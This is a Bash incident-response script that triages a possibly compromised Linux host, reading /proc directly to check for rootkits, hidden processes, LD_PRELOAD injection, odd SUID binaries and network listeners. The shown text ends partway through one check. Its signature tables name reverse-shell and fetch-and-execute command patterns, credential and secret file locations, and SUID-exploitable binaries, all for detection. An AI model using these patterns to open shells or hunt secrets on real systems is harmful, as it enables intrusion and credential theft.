#!/usr/bin/env bash
# bluesweep.sh - single-file blue team host triage
#
# Drop-and-run enumeration of a possibly-compromised Linux host: persistence,
# rootkit inconsistencies, backdoor access, weak accounts.
#
# Governing principle: ASSUME THE USERLAND IS LYING. Every check that can read
# /proc or /sys directly does so; results sourced from ps/ss/netstat are tagged
# 'untrusted-source'. Several checks exist only to diff the kernel's view
# against the userland tool's view.
#
# Side effects: normal scans write no files or configuration and affect no target
# services/processes. Explicit export, baseline and sandbox modes write files.
# Budget watchdogs terminate only child commands created by this script. (Reading still bumps atime on relatime mounts and the run
# lands in auditd/wtmp - see README.)
#
# License: MIT

set -u
IFS=$' \t\n'
ORIGINAL_PATH=${PATH:-}
PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH
LC_ALL=C
export LC_ALL
umask 077

VERSION="0.2.0"
TAB=$'\t'
NL=$'\n'

# ---------------------------------------------------------------------------
# usage
# ---------------------------------------------------------------------------
usage() {
    cat <<'EOF'
bluesweep.sh - blue team host triage

USAGE
    bluesweep.sh [options]

OPTIONS
    -q, --quick         Fast pass, no full-filesystem walk (default)
    -f, --full          Local filesystem walk, package verification, deeper PID probes
    -r, --root DIR      Treat DIR as / (offline triage of a mounted image)
    -m, --min-sev SEV   Only show findings at or above SEV
                        (CRIT HIGH MED LOW INFO). Default: LOW
    -v, --verbose       Also show OK results
        --no-color      Disable ANSI color (also honors NO_COLOR)
        --exit-zero     Always exit 0 regardless of findings
        --raw           Dump the raw record stream, no rendering
        --baseline FILE Save a snapshot; FILE=- streams it to stdout
        --diff FILE     Compare with a same-host, same-mode snapshot
        --force         Override diff host identity mismatch only
        --json FILE     NDJSON records; FILE=- selects JSON-only stdout
        --out DIR       New evidence directory with records, artifacts and hashes
        --ir DIR        Evidence directory plus incident-response Markdown report
        --remediate FILE Create a commented review script; never execute fixes
        --hunt REGEX    Content hunt over bounded filesystem candidates
        --recent-days N Recent-file selection window, 1..99 (default: 7)
        --weak-pass     Opt-in small password-candidate audit; secrets withheld
        --weak-pass-file FILE  Additional candidates (64 total maximum)
        --bench         Print elapsed scan time; no automatic fork measurement
        --selftest MODE Run unit (no writes), sandbox (temporary fixtures), or lint
    -V, --version       Print version and exit
    -h, --help          This text

EXIT CODES
    0   nothing above INFO        10/20/30/40  worst was LOW/MED/HIGH/CRIT
    2   usage error               3            ran but incomplete
    4   self-test failure

Run as root for full coverage. Unprivileged runs are supported and will
report how many checks were degraded or skipped.
EOF
}

# ---------------------------------------------------------------------------
# options
# ---------------------------------------------------------------------------
OPT_MODE=quick
OPT_ROOT=""
OPT_MINSEV=LOW
OPT_VERBOSE=0
OPT_NOCOLOR=0
OPT_EXITZERO=0
OPT_RAW=0
OPT_SELFTEST=""
OPT_BASELINE="" OPT_DIFF="" OPT_JSON="" OPT_OUT="" OPT_IR="" OPT_REMEDIATE=""
OPT_HUNT="" OPT_FORCE=0 OPT_WEAK=0 OPT_WEAK_FILE="" OPT_BENCH=0
HOST_ID="" MACHINE_ID=""

parse_args() {
    while (( $# )); do
        case $1 in
            -q|--quick)    OPT_MODE=quick ;;
            -f|--full)     OPT_MODE=full ;;
            -r|--root)
                (( $# >= 2 )) && [[ -n $2 && $2 != -* && -d $2 ]] || {
                    warn "--root requires an existing directory"; exit 2;
                }
                shift; OPT_ROOT=${1%/}; [[ -n $OPT_ROOT ]] || OPT_ROOT=/ ;;
            -m|--min-sev)
                (( $# >= 2 )) || { warn "--min-sev requires a severity"; exit 2; }
                shift; OPT_MINSEV=$1 ;;
            --selftest)
                (( $# >= 2 )) || { warn "--selftest requires unit or sandbox"; exit 2; }
                shift; OPT_SELFTEST=$1
                case $OPT_SELFTEST in unit|sandbox|lint) ;; *) warn "unknown selftest mode"; exit 2 ;; esac ;;
            -v|--verbose)  OPT_VERBOSE=1 ;;
            --no-color)    OPT_NOCOLOR=1 ;;
            --exit-zero)   OPT_EXITZERO=1 ;;
            --raw)         OPT_RAW=1 ;;
            --baseline|--diff|--json|--out|--ir|--remediate|--hunt|--weak-pass-file|--recent-days)
                (( $# >= 2 )) && [[ -n $2 && $2 != --* ]] || { warn "$1 requires a value"; exit 2; }
                local option=$1; shift
                case $option in
                    --baseline) OPT_BASELINE=$1 ;; --diff) OPT_DIFF=$1 ;; --json) OPT_JSON=$1 ;;
                    --out) OPT_OUT=$1 ;; --ir) OPT_IR=$1 ;; --remediate) OPT_REMEDIATE=$1 ;;
                    --hunt) OPT_HUNT=$1 ;; --weak-pass-file) OPT_WEAK_FILE=$1; OPT_WEAK=1 ;;
                    --recent-days) RECENT_DAYS=$1 ;;
                esac ;;
            --force) OPT_FORCE=1 ;;
            --weak-pass) OPT_WEAK=1 ;;
            --bench) OPT_BENCH=1 ;;
            -V|--version)  printf 'bluesweep.sh %s\n' "$VERSION"; exit 0 ;;
            -h|--help)     usage; exit 0 ;;
            *) printf 'bluesweep: unknown option: %s\n' "$1" >&2; usage >&2; exit 2 ;;
        esac
        shift
    done
    case $OPT_MINSEV in
        CRIT|HIGH|MED|LOW|INFO) ;;
        *) printf 'bluesweep: bad --min-sev: %s\n' "$OPT_MINSEV" >&2; exit 2 ;;
    esac
    if [[ -n $OPT_SELFTEST && -n $OPT_ROOT ]]; then
        warn "--selftest cannot be combined with --root"; exit 2
    fi
    [[ $RECENT_DAYS =~ ^[1-9][0-9]?$ ]] || { warn "--recent-days must be 1..99"; exit 2; }
    if [[ -n $OPT_BASELINE && ( -n $OPT_DIFF || -n $OPT_JSON || -n $OPT_OUT || -n $OPT_IR || -n $OPT_REMEDIATE ) ]]; then
        warn "--baseline cannot be combined with diff/export options"; exit 2
    fi
    if (( OPT_RAW )) && [[ -n $OPT_JSON || -n $OPT_OUT || -n $OPT_IR || -n $OPT_REMEDIATE ]]; then
        warn "--raw cannot be combined with export options"; exit 2
    fi
    if [[ -n $OPT_OUT && -n $OPT_IR && $OPT_OUT != "$OPT_IR" ]]; then
        warn "use one directory for --out and --ir"; exit 2
    fi
    [[ -z $OPT_WEAK_FILE || -r $OPT_WEAK_FILE ]] || { warn "weak password candidate file unreadable"; exit 2; }
    if [[ -n $OPT_HUNT ]]; then
        BLUESWEEP_HUNT="$OPT_HUNT" awk 'BEGIN {r=ENVIRON["BLUESWEEP_HUNT"]; x=("" ~ r)}' </dev/null 2>/dev/null || { warn "invalid --hunt regular expression"; exit 2; }
    fi
    ROOT=$OPT_ROOT
    [[ -z $ROOT ]] || ROOT=$(cd -- "$ROOT" && pwd -P)
    [[ $ROOT == / ]] && ROOT=""
    PROCFS="$ROOT/proc"
    # An offline image has no live /proc; fall back to the real one only when
    # no --root was given.
    [[ -z $ROOT ]] && PROCFS=/proc
}

# ---------------------------------------------------------------------------
# ===================== SIGNATURE BLOCK (editable) ==========================
# ---------------------------------------------------------------------------

# Filename-only coverage inventory compared with the local linPEAS copy.
SIG_INTERESTING='*.asc
*.cer
*.crt
*.csr
*.db
*.der
*.ftpconfig
*.gnupg
*.gpg
*.jks
*.kdbx
*.key
*.keyring
*.keystore
*.keytab
*.maintenance*
*.ovpn
*.p12
*.pcap
*.pcapng
*.pem
*.pfx
*.pgp
*.psk
*.pub
*.rdg
*.service
*.socket
*.sqlite
*.sqlite3
*.swp
*.tf
*.tfstate
*.timer
*.vhd
*.vhdx
*.viminfo
*.vmdk
*_history*
*config*.php
*credential*
*knockd*
*password*
*vnc*.c*nf*
*vnc*.ini
*vnc*.txt
*vnc*.xml
.Xauthority
.bashrc
.boto
.credentials.json
.env*
.erlang.cookie
.flyrc
.git
.git-credentials
.gitconfig
.github
.google_authenticator
.htpasswd
.k5login
.ldaprc
.lesshst
.msmtprc
.plan
.profile
.pypirc
.recently-used.xbel
.rhosts
.roadtools_auth
.secrets.mkey
.sudo_as_admin_successful
.vault-token
.wgetrc
000-default.conf
AppEvent.Evt
AzureRMContext.json
ConsoleHost_history.txt
Dockerfile
Elastix.conf
FreePBX.conf
FreeSSHDservice.ini
KeePass.config*
KeePass.enforced*
KeePass.ini
NetSetup.log
Ntds.dit
RDCMan.settings
SAM
SYSTEM
SecEvent.Evt
TokenCache.dat
access.log
accessTokens.json
access_tokens.db
access_tokens.json
adc.json
agent.*
airflow.cfg
amportal.conf
anaconda-ks.cfg
api_key
appcmd.exe
apt.conf
atlantis.db
authorized_hosts
authorized_keys
autologin
autologin.conf
autounattend.xml
azureProfile.json
backup
backups
bash.exe
bitcoin.conf
cesi.conf
cloud.cfg
clouds.config
config.php
config.xml
containerd.sock
credentials.db
credentials.tfrc.json
credentials.xml
creds*
crio.sock
crontab-ui.service
crontab.db
database.php
datasources.xml
db.php
ddclient.conf
debian.cnf
default.sav
docker-compose.yml
docker.sock
docker.socket
dockershim.sock
drives.xml
elasticsearch.y*ml
environment
error.log
exports
fastcgi_params
fat.config
ffftp.ini
filezilla.xml
firebase-tools.json
frakti.sock
ftp.config
ftp.ini
gitlab.rm
gitlab.yml
glusterfs.ca
glusterfs.key
glusterfs.pem
gpg-agent.conf
grafana.ini
groups.xml
gvm-tools.conf
hostapd.conf
hosts.equiv
httpd.conf
https-xampp.conf
https.conf
hudson.util.Secret
id_dsa*
id_rsa*
iis6.log
index.dat
influxdb.conf
ipsec.conf
ipsec.secrets
jetty-realm.properties
kadm5.acl
kcpassword
keys.log
kibana.y*ml
known_hosts
krb5.conf
krb5cc_*
legacy_credentials.db
log4j-core*.jar
mariadb.cnf
master.key
mongod*.conf
mosquitto.conf
msal_http_cache.bin
msal_token_cache.bin
msal_token_cache.json
my.cnf
my.ini
mysqld.cnf
nginx.conf
ntuser.dat
pagefile.sys
passbolt.php
passwd
passwd.ibd
password*.ibd
pg_hba.conf
pgadmin*.db
pgadmin4.db
pgsql.conf
php.ini
plum.sqlite
postgresql.conf
printers.xml
private-keys-v1.d/*.key
protecteduserkey.bin
psk.txt
pubring.kbx
pwd.ibd
racoon.conf
recentservers.xml
redis.conf
rktlet.sock
rocketchat.service
rpcd
rsyncd.conf
rsyncd.secrets
scclient.exe
scheduledtasks.xml
secret.asc
secrets.ldb
secrets.yml
secring.gpg
security.sav
sentry.conf.py
server.xml
service_principal_entries.bin
service_principal_entries.json
sess_*
settings.php
setupinfo
setupinfo.bak
sip.conf
sitemanager.xml
sites.ini
smb.conf
snmpd.conf
snyk.config.json
snyk.json
software
software.sav
ssh*config
ssh-agent.sock
sslkeylog.log
sssd.conf
storage.php
supervisord.conf
sysprep.inf
sysprep.xml
system.sav
tomcat-users.xml
trustdb.gpg
unattend.inf
unattend.txt
unattend.xml
unattended.xml
vault-ssh-helper.hcl
vsftpd.conf
wcx_ftp.ini
web*.config
webserver_config.py
winscp.ini
wp-config.php
ws_ftp.ini
wsl.exe
zabbix_agentd.conf
zabbix_server.conf'

# Known rootkit artifact paths. Matched literally against the filesystem.
SIG_RK_PATH='/dev/.udev
/dev/.initramfs
/dev/.static
/usr/share/.home
/etc/rc.d/init.d/rc.modules
/lib/libproc.a
/usr/bin/ntpsx
/usr/lib/libDiamorphine.so
/lib/modules/diamorphine.ko
/usr/include/hosts.h
/usr/include/file.h
/etc/ld.so.hash
/dev/shm/.x'

# Kernel symbol prefixes that betray a loaded rootkit in /proc/kallsyms.
SIG_RK_SYM='diamorphine
reptile
khook
rkit_
hide_pid
hide_tcp
hacked_'

# Basenames that must NEVER be SUID, anywhere, including /usr/bin.
# GTFOBins staples: possession of any of these as SUID is game over.
SIG_SUID_NEVER='bash
sh
dash
zsh
ksh
python
python2
python3
perl
ruby
lua
awk
gawk
mawk
find
vim
vi
nano
emacs
tar
zip
cp
mv
dd
env
nmap
node
php
gdb
strace
ltrace
docker
less
more
man
ftp
socat
nc
ncat
netcat
busybox
tclsh
expect
rsync
wget
curl'

# Canonical SUID/SGID binaries across Debian/Ubuntu/RHEL families. Anything
# SUID and NOT on this list is reported; anything outside the system bin dirs
# is reported regardless of name.
SIG_SUID_OK='/usr/bin/at
/usr/bin/chage
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/expiry
/usr/bin/fusermount
/usr/bin/fusermount3
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/ntfs-3g
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/su
/usr/bin/sudo
/usr/bin/sudoedit
/usr/bin/umount
/usr/bin/wall
/usr/bin/write
/usr/bin/ssh-agent
/usr/bin/screen
/usr/bin/dotlockfile
/usr/bin/mlocate
/usr/bin/locate
/usr/bin/bsd-write
/usr/bin/staprun
/usr/bin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/mount.nfs
/usr/sbin/postdrop
/usr/sbin/postqueue
/usr/sbin/exim4
/usr/sbin/sendmail
/usr/sbin/usernetctl
/usr/sbin/grub2-set-bootflag
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/libexec/openssh/ssh-keysign
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
/usr/libexec/utempter/utempter
/bin/mount
/bin/umount
/bin/su
/bin/ping
/bin/ping6
/bin/fusermount
/sbin/mount.nfs
/sbin/unix_chkpwd
/sbin/pam_timestamp_check'

# Security agents. NEVER flag these as suspicious and never suggest removing
# them - they are the defender's telemetry, and attackers kill them first.
SIG_AGENT='wazuh-agent
wazuh-agentd
wazuh-modulesd
wazuh-logcollector
wazuh-execd
wazuh-syscheckd
ossec-agentd
ossec-syscheckd
osqueryd
auditd
falco
velociraptor
filebeat
winlogbeat
splunkd
sysmon
nxlog
td-agent
fluent-bit'

# Cron / unit command patterns that indicate remote-fetch or obfuscated exec.
# Extended regex, fed to awk. A literal single-quote is written [\047].
SIG_BADCMD='(curl|wget|fetch)[^|;&]*[|][[:space:]]*(ba)?sh|\
base64[[:space:]]+(-d|--decode)|\
(python|perl|ruby|php)[[:space:]]+-[ec][[:space:]]|\
/dev/tcp/|\
nc([[:space:]]+-[a-z]*e)|\
ncat[^;]*--exec|\
socat[^;]*exec|\
bash[[:space:]]+-i[[:space:]]*>&|\
mkfifo[^;]*\|[[:space:]]*(ba)?sh|\
chattr[[:space:]]+[+]i|\
history[[:space:]]+-c|\
/dev/shm/|\
/tmp/\.'

# ---------------------------------------------------------------------------
# primitives
# ---------------------------------------------------------------------------

have() { command -v "$1" >/dev/null 2>&1; }

warn() { printf 'bluesweep: %s\n' "$*" >&2; }

# Strip record separators from a value without forking.
scrub() {
    _SCRUB=${1:0:16384}
    _SCRUB=${_SCRUB//$TAB/ }
    _SCRUB=${_SCRUB//$NL/ }
    _SCRUB=${_SCRUB//$'\r'/ }
}

# hex2ip 0100007F -> 127.0.0.1   (/proc/net is little-endian, no forks)
hex2ip() {
    local h=$1
    printf '%d.%d.%d.%d' "0x${h:6:2}" "0x${h:4:2}" "0x${h:2:2}" "0x${h:0:2}"
}

hex2port() { printf '%d' "0x$1"; }

# Compact an IPv6 /proc/net address (32 hex chars, 4 little-endian words).
hex2ip6() {
    local h=${1,,} w out="" i b
    for (( i = 0; i < 32; i += 8 )); do
        w=${h:i:8}
        out+="${w:6:2}${w:4:2}${w:2:2}${w:0:2}"
    done
    # v4-mapped ::ffff:a.b.c.d
    if [[ ${out:0:24} == 00000000000000000000ffff ]]; then
        printf '::ffff:%d.%d.%d.%d' \
            "0x${out:24:2}" "0x${out:26:2}" "0x${out:28:2}" "0x${out:30:2}"
        return
    fi
    # Build the 8 groups, then apply RFC 5952 zero-compression so the output
    # matches what ss/ip print (:: rather than 0:0:0:0:0:0:0:0).
    local -a g=()
    for (( i = 0; i < 32; i += 4 )); do
        printf -v b '%x' "0x${out:i:4}"
        g+=("$b")
    done
    local best=-1 bestlen=0 run=0 start=0
    for (( i = 0; i < 8; i++ )); do
        if [[ ${g[i]} == 0 ]]; then
            (( run == 0 )) && start=$i
            run=$(( run + 1 ))
            if (( run > bestlen )); then bestlen=$run; best=$start; fi
        else
            run=0
        fi
    done
    (( bestlen < 2 )) && best=-1
    local res="" i2
    for (( i = 0; i < 8; i++ )); do
        if (( best >= 0 && i == best )); then
            res+="::"
            (( i += bestlen - 1 ))
            continue
        fi
        [[ -n $res && ${res: -1} != ":" ]] && res+=":"
        res+=${g[i]}
    done
    [[ $res == "" ]] && res="::"
    printf '%s' "$res"
}

# ---------------------------------------------------------------------------
# capability probe - test BEHAVIOR, not binary presence
# ---------------------------------------------------------------------------
CAP_ROOT=0 CAP_PROC=0 CAP_FIND_PRINTF=0 CAP_STAT=0 CAP_PS=0
CAP_SS=0 CAP_NETSTAT=0 CAP_SYSTEMCTL=0 CAP_LSATTR=0 CAP_HASH=""
IN_CONTAINER=0 DISTRO_ID="" DISTRO_LIKE=""

probe_toolbox() {
    [[ $(id -u 2>/dev/null) == 0 ]] && CAP_ROOT=1
    [[ -r $PROCFS/1/stat ]] && CAP_PROC=1

    find / -maxdepth 0 -printf '' 2>/dev/null && CAP_FIND_PRINTF=1

    case "$(stat -c '%s' "$ROOT/etc/hostname" 2>/dev/null)" in
        ''|*[!0-9]*) CAP_STAT=0 ;;
        *)           CAP_STAT=1 ;;
    esac

    have ps        && CAP_PS=1
    have ss        && CAP_SS=1
    have netstat   && CAP_NETSTAT=1
    have systemctl && CAP_SYSTEMCTL=1
    have lsattr    && CAP_LSATTR=1

    local h
    for h in sha256sum shasum sha1sum md5sum cksum; do
        have "$h" && { CAP_HASH=$h; break; }
    done

    [[ -f $ROOT/.dockerenv ]] && IN_CONTAINER=1
    if [[ -r $PROCFS/1/cgroup ]]; then
        case "$(<"$PROCFS/1/cgroup")" in
            *docker*|*lxc*|*kubepods*|*containerd*) IN_CONTAINER=1 ;;
        esac
    fi

    if [[ -r $ROOT/etc/os-release ]]; then
        local line
        while IFS= read -r line; do
            case $line in
                ID=*)      DISTRO_ID=${line#ID=} ;;
                ID_LIKE=*) DISTRO_LIKE=${line#ID_LIKE=} ;;
            esac
        done < "$ROOT/etc/os-release"
        DISTRO_ID=${DISTRO_ID//\"/}
        DISTRO_LIKE=${DISTRO_LIKE//\"/}
    fi
}

# ---------------------------------------------------------------------------
# emitters - every record is one TAB-delimited line on stdout
# ---------------------------------------------------------------------------
_EMITTED=0

emit_raw() { printf '%s\n' "$1"; }

_join() {                       # _join TAG args... -> scrubbed TAB record
    local out=$1 a; shift
    for a in "$@"; do
        if (( ${#a} > 16384 )); then
            printf 'SKIP\tREC001\tRecord field capped at 16384 bytes; truncated=1\n'
        fi
        scrub "$a"
        out+="$TAB$_SCRUB"
    done
    emit_raw "$out"
}

# finding ID SEV CAT CONF TITLE TARGET EVIDENCE FIXID
finding() { _EMITTED=1; _join FIND "$@"; }
skip()    { _EMITTED=1; _join SKIP "$@"; }
ok()      { _EMITTED=1; _join OK   "$@"; }
obs()     { _join OBS "$@"; }
meta()    { _join META "$@"; }

# Every check must produce a verdict. A silent check is itself a bug.
run_check() {
    local id=$1 rc
    _EMITTED=0
    "$id"; rc=$?
    (( _EMITTED == 0 )) && \
        finding "$id" ERROR internal confirmed \
            "Check produced no verdict" "-" "rc=$rc" "-"
    return 0
}

emit_sig_tables() {
    local t v
    for t in RK_PATH RK_SYM SUID_NEVER SUID_OK AGENT INTERESTING; do
        eval "local _tbl=\$SIG_$t"
        while IFS= read -r v; do
            [[ -n $v ]] && _join SIG "$t" "$v"
        done <<< "$_tbl"
    done
}

# ---------------------------------------------------------------------------
# collectors
# ---------------------------------------------------------------------------

declare -A PS_PIDS=()       # pid set as reported by ps(1), captured first
declare -A PROC_EXE=()      # pid -> exe target (may end in " (deleted)")
declare -A PROC_COMM=()
declare -A PROC_PPID=()
declare -A PROC_CMD=()
declare -a PROC_PIDS=()

col_proc() {
    if (( CAP_PROC == 0 )); then
        skip PROC000 "no readable $PROCFS - process checks unavailable"
        return
    fi

    # Snapshot ps BEFORE reading /proc. Ordering matters: anything ps saw that
    # our later /proc read missed either exited (re-stat proves it) or is being
    # hidden. The reverse ordering makes every short-lived process a false hit.
    if (( CAP_PS == 1 )) && [[ -z $ROOT ]]; then
        local p
        while read -r p _; do
            [[ $p == *[!0-9]* ]] && continue
            PS_PIDS[$p]=1
        done < <(ps -eo pid= 2>/dev/null)
    fi

    # One fork for every exe link, instead of one readlink per process.
    local line pid tgt
    while IFS= read -r line; do
        case $line in
            *" -> "*) ;;
            *) continue ;;
        esac
        tgt=${line#*" -> "}
        pid=${line%%/exe*}
        pid=${pid##*/proc/}
        [[ $pid == *[!0-9]* ]] && continue
        PROC_EXE[$pid]=$tgt
    done < <(ls -l "$PROCFS"/[0-9]*/exe 2>/dev/null)

    local d st tmp rest state ppid c x
    for d in "$PROCFS"/[0-9]*; do
        pid=${d##*/}
        [[ $pid == *[!0-9]* ]] && continue
        if [[ ! -r $d/stat ]]; then
            obs PROCUNREAD "$pid" 1
            continue
        fi
        read -r st < "$d/stat" 2>/dev/null || continue
        # comm may contain spaces AND parens: take text between the first '('
        # and the LAST ') '. Getting this wrong is the classic /proc bug.
        if ! parse_proc_stat "$st"; then skip PROC_PARSE "malformed or raced process stat: pid=$pid"; continue; fi
        c=$PARSED_COMM; state=$PARSED_STATE; ppid=$PARSED_PPID
        rest=${st##*") "}

        local -a argv=()
        while IFS= read -r -d '' x; do argv+=("$x"); (( ${#argv[@]} < 256 )) || { skip PROC_ARGV "process argv capped at 256 arguments: pid=$pid"; break; }; done < "$d/cmdline" 2>/dev/null
        local cmd="${argv[*]:-}"

        if (( ${#PROC_PIDS[@]} >= 10000 )); then skip PROC_LIMIT "process inventory capped at 10000; truncated=1"; break; fi
        PROC_PIDS+=("$pid")
        PROC_COMM[$pid]=$c
        PROC_PPID[$pid]=$ppid
        PROC_CMD[$pid]=$cmd
        local -a stat_fields=()
        read -r -a stat_fields <<< "$rest"
        obs PROC "$pid" "${PROC_PPID[$pid]}|$state|$c|${PROC_EXE[$pid]:-}|$cmd|start_ticks=${stat_fields[19]:-unknown}"
        if [[ -n ${PROC_EXE[$pid]:-} && $cmd != *bluesweep* ]]; then
            case ${PROC_EXE[$pid]} in */bash|*/awk|*/gawk|*/find|*/sleep|*/ps|*/cat|*/tee) ;;
                *) obs PROC_ID "${PROC_EXE[$pid]}|$cmd" running ;;
            esac
        fi
    done
}

declare -A SOCK_PID=()      # socket inode -> pid
declare -a LISTEN_ROWS=()   # proto|addr|port|uid|inode

col_net() {
    if [[ ! -r $PROCFS/net/tcp ]]; then
        if [[ -z $ROOT ]]; then
            local output=''
            if have ss; then output=$(run_bounded 5 ss -lntupH 2>/dev/null);
            elif have netstat; then output=$(run_bounded 5 netstat -lntu 2>/dev/null); fi
            if [[ -n $output ]]; then
                while IFS= read -r line; do finding NET002 INFO network untrusted-source "Listener tool fallback" socket "$line" review_network; done <<< "$output"
            fi
        fi
        skip NET000 "no $PROCFS/net - kernel socket checks unavailable"
        return
    fi

    # One fork for the whole fd table.
    local line pid ino
    while IFS= read -r line; do
        case $line in
            "$PROCFS"/*/fd*:) pid=${line#"$PROCFS"/}; pid=${pid%%/*}; continue ;;
            *" -> socket:["*)
                ino=${line#*" -> socket:["}
                ino=${ino%%]*}
                SOCK_PID[$ino]=${pid:-?}
                ;;
        esac
    done < <(ls -l "$PROCFS"/[0-9]*/fd/ 2>/dev/null)

    local f proto st local_a rem_a uid inode addr port remote remote_port
    for f in tcp tcp6 udp udp6; do
        [[ -r $PROCFS/net/$f ]] || continue
        proto=$f
        {
            read -r _   # header
            while read -r _ local_a rem_a st _ _ _ uid _ inode _; do
                addr=${local_a%%:*}
                port=${local_a##*:}
                case $proto in
                    tcp6|udp6) addr=$(hex2ip6 "$addr") ;;
                    *)         addr=$(hex2ip "$addr") ;;
                esac
                port=$(hex2port "$port")
                obs SOCK "$proto:$addr:$port" "$st|$uid|$inode|${SOCK_PID[$inode]:-}"
                if [[ $st == 01 && $proto == tcp* ]]; then
                    remote=${rem_a%%:*}; remote_port=$(hex2port "${rem_a##*:}")
                    if [[ $proto == tcp6 ]]; then remote=$(hex2ip6 "$remote"); else remote=$(hex2ip "$remote"); fi
                    obs CONNECTION "$proto:$addr:$port" "$remote:$remote_port|pid=${SOCK_PID[$inode]:-unknown}"
                    case $remote in 127.*|10.*|192.168.*|172.1[6-9].*|172.2[0-9].*|172.3[01].*|169.254.*|::1|fc*:*|fd*:*|fe80:*|::ffff:127.*|::ffff:10.*|::ffff:192.168.*) ;;
                        *) finding NET022 INFO network possible "Established connection to a non-private peer" "$remote:$remote_port" "local=$addr:$port owner_pid=${SOCK_PID[$inode]:-unknown}; direction/intent not established" review_network ;;
                    esac
                fi
                case $proto:$st in
                    tcp:0A|tcp6:0A)
                        LISTEN_ROWS+=("$proto|$addr|$port|$uid|$inode") ;;
                    udp:07|udp6:07)
                        LISTEN_ROWS+=("$proto|$addr|$port|$uid|$inode") ;;
                esac
            done
        } < "$PROCFS/net/$f"
    done
}

# ---------------------------------------------------------------------------
# checks
# ---------------------------------------------------------------------------

# --- M04: /etc/ld.so.preload -----------------------------------------------
chk_ldpreload() {
    local f="$ROOT/etc/ld.so.preload" line n=0
    if [[ ! -e $f ]]; then
        ok LDP001 "no /etc/ld.so.preload"
        return
    fi
    while IFS= read -r line; do
        [[ -z ${line// /} ]] && continue
        case $line in \#*) continue ;; esac
        n=$(( n + 1 ))
        finding LDP001 CRIT rootkit confirmed \
            "/etc/ld.so.preload is populated - library injected into every process" \
            "$f" "$line" rm_ldpreload
    done < "$f"
    (( n == 0 )) && ok LDP001 "/etc/ld.so.preload exists but is empty"

    # LD_PRELOAD in a live process environ (root only)
    if (( CAP_ROOT == 1 && CAP_PROC == 1 )); then
        local pid e
        for pid in "${PROC_PIDS[@]}"; do
            [[ -r $PROCFS/$pid/environ ]] || continue
            while IFS= read -r -d '' e; do
                case $e in
                    LD_PRELOAD=*|LD_AUDIT=*|LD_LIBRARY_PATH=/tmp*|LD_LIBRARY_PATH=/dev/shm*)
                        finding LDP002 HIGH rootkit likely \
                            "Process running with library-injection environment" \
                            "pid=$pid ${PROC_COMM[$pid]:-}" "$e" inspect_proc
                        ;;
                esac
            done < "$PROCFS/$pid/environ"
        done
    elif (( CAP_ROOT == 0 )); then
        skip LDP002 "LD_PRELOAD environ scan needs root"
    fi
}

# --- M04: hidden PIDs -------------------------------------------------------
chk_hidden_pid() {
    if (( CAP_PROC == 0 )); then
        skip RK001 "no readable $PROCFS"
        return
    fi

    local -A seen=()
    local pid
    for pid in "${PROC_PIDS[@]}"; do seen[$pid]=1; done

    # Probe 1: PPIDs referenced by visible processes but absent from /proc.
    local pp found=0
    for pid in "${PROC_PIDS[@]}"; do
        pp=${PROC_PPID[$pid]}
        [[ $pp == 0 ]] && continue
        if [[ -z ${seen[$pp]:-} ]]; then
            local current_stat current_parent current_state
            [[ -r $PROCFS/$pid/stat ]] || continue
            read -r current_stat < "$PROCFS/$pid/stat" || continue
            read -r current_state current_parent _ <<< "${current_stat##*") "}"
            [[ $current_parent == "$pp" ]] || continue
            found=1
            finding RK001 HIGH rootkit possible \
                "Parent PID referenced by a live process but hidden from /proc" \
                "ppid=$pp child=$pid ${PROC_COMM[$pid]:-}" \
                "child cmdline: ${PROC_CMD[$pid]:-}" capture_memory
        fi
    done

    # Probe 2: userland ps vs kernel /proc, both directions, race-resolved.
    if (( CAP_PS == 1 )) && [[ -z $ROOT ]]; then
        local q
        # ps saw it, our /proc read did not: report only if it is STILL there.
        for q in "${!PS_PIDS[@]}"; do
            [[ -n ${seen[$q]:-} ]] && continue
            [[ -d $PROCFS/$q ]] || continue    # exited between the two reads
            found=1
            finding RK003 HIGH rootkit likely \
                "ps lists a PID that was absent from the /proc directory listing" \
                "pid=$q" "readdir hiding, or /proc enumeration interference" \
                capture_memory
        done
        # /proc has it, ps does not: re-ask ps for that one PID before calling it.
        for q in "${PROC_PIDS[@]}"; do
            [[ -n ${PS_PIDS[$q]:-} ]] && continue
            [[ -d $PROCFS/$q ]] || continue    # exited, fine
            ps -p "$q" >/dev/null 2>&1 && continue   # ps agrees on recheck
            found=1
            finding RK006 CRIT rootkit confirmed \
                "Process present in /proc but hidden from ps on recheck - ps is lying" \
                "pid=$q ${PROC_COMM[$q]:-}" "cmd=${PROC_CMD[$q]:-}" capture_memory
        done
    elif [[ -n $ROOT ]]; then
        skip RK003 "ps diff is meaningless against --root (offline image)"
    else
        skip RK003 "ps unavailable - cannot diff userland against /proc"
    fi

    # Probe 3: direct stat for every PID the listing omitted.
    #
    # Subtlety that makes or breaks this check: Linux deliberately omits
    # thread TIDs from /proc readdir while keeping /proc/TID statable, so
    # "statable but unlisted" is NORMAL for threads. The evidence is the
    # thread group: read Tgid from /proc/N/status and only report when the
    # owning process is itself absent from the listing (or when N is its own
    # thread group leader, i.e. a genuinely hidden process).
    if [[ $OPT_MODE == full ]]; then
    local max=32768 n=1 tgid line
    [[ -r $PROCFS/sys/kernel/pid_max ]] && read -r max < "$PROCFS/sys/kernel/pid_max"
    [[ $max =~ ^[0-9]+$ ]] || max=32768
    if (( max > 65536 )); then max=65536; skip RK004 "PID direct-probe capped at 65536; higher PIDs not checked"; fi
    while (( n <= max )); do
        if [[ -z ${seen[$n]:-} && -d $PROCFS/$n ]]; then
            tgid=""
            if [[ -r $PROCFS/$n/status ]]; then
                while IFS= read -r line; do
                    # NB: /proc/N/status uses a TAB after the key, not a space.
                    case $line in Tgid:*) tgid=${line#Tgid:}; tgid=${tgid//[[:space:]]/}; break ;; esac
                done < "$PROCFS/$n/status"
